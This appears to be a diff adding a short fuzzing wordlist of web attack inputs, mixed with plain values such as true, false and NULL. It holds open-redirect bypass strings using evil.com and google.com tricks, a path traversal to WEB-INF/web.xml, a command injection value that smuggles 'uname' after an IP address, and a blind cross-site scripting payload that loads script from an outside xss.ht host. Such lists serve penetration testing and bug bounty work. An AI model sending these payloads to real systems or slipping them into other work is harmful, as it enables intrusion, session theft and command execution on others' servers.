@@ -1,0 +1,15 @@
+///www.x.com@evil.com/
+//google.com?
+////google%E3%80%82com
+//.@.@google.com
+../../../WEB-INF/web.xml?
+on
+off
+http://yimg.com/
+true
+false
+NULL
+127.0.0.1||uname
+1
+1"'<!--></Script/><Svg /OnLoad=appendChild(createElement(`Script`)).src=`https://ragnarokv.xss.ht`></i>
+
